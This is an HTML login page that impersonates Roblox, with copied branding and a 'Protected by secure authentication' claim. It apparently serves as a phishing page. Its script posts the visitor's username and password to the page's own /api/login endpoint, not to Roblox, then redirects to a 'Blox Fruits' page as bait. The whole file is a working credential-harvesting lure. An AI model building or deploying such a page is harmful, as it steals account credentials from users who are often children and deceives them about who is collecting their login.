<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login to Roblox</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: Montserrat, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background-color: #121212; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .login-container { background: #191b1f; padding: 32px; border-radius: 12px; width: 100%; max-width: 400px; box-shadow: 0 8px 24px rgba(0,0,0,0.5); text-align: center; border: 1px solid #2c2f36; }
        
        /* Логотип Roblox */
        .logo { font-size: 32px; font-weight: 900; letter-spacing: 2px; margin-bottom: 24px; color: #fff; text-transform: uppercase; }
        .logo span { color: #e11d48; }

        .input-group { margin-bottom: 16px; text-align: left; }
        .input-group label { display: block; font-size: 12px; font-weight: 600; color: #9ca3af; margin-bottom: 6px; text-transform: uppercase; }
        
        input { width: 100%; padding: 14px; background: #23252b; border: 1px solid #3f444e; border-radius: 8px; color: #fff; font-size: 15px; outline: none; transition: border-color 0.2s; }
        input:focus { border-color: #0074e8; background: #1f2128; }
        
        .login-btn { background: #0074e8; color: white; border: none; width: 100%; padding: 14px; border-radius: 8px; font-weight: 700; font-size: 16px; cursor: pointer; margin-top: 10px; transition: background 0.2s; }
        .login-btn:hover { background: #0063c6; }
        
        #status { margin-top: 16px; font-size: 14px; font-weight: 500; }
        
        .footer-text { margin-top: 20px; font-size: 12px; color: #6b7280; }
    </style>
</head>
<body>

    <div class="login-container">
        <div class="logo">ROBL<span>OX</span></div>
        
        <div class="input-group">
            <label>Username / Email / Phone</label>
            <input type="text" id="usernameInput" placeholder="Username">
        </div>

        <div class="input-group">
            <label>Password</label>
            <input type="password" id="passwordInput" placeholder="Password">
        </div>

        <button class="login-btn" onclick="loginUser()">Log In</button>
        <div id="status"></div>
        
        <div class="footer-text">Protected by secure authentication</div>
    </div>

    <script>
        async function loginUser() {
            const username = document.getElementById('usernameInput').value.trim();
            const password = document.getElementById('passwordInput').value.trim();
            const statusDiv = document.getElementById('status');

            if (!username || !password) {
                statusDiv.style.color = '#ef4444';
                statusDiv.innerText = 'Please fill in all fields.';
                return;
            }

            statusDiv.style.color = '#9ca3af';
            statusDiv.innerText = 'Logging in...';

            try {
                const response = await fetch('/api/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username, password })
                });

                const data = await response.json();

                if (response.ok) {
                    statusDiv.style.color = '#22c55e';
                    statusDiv.innerText = 'Success! Redirecting to Blox Fruits...';
                    
                    // Перенаправление на страницу Blox Fruits через 1.5 секунды
                    setTimeout(() => {
                        window.location.href = '/blox-fruits';
                    }, 1500);

                } else {
                    statusDiv.style.color = '#ef4444';
                    statusDiv.innerText = data.error || 'Login failed';
                }
            } catch (err) {
                statusDiv.style.color = '#ef4444';
                statusDiv.innerText = 'Connection error.';
            }
        }
    </script>

</body>
</html>
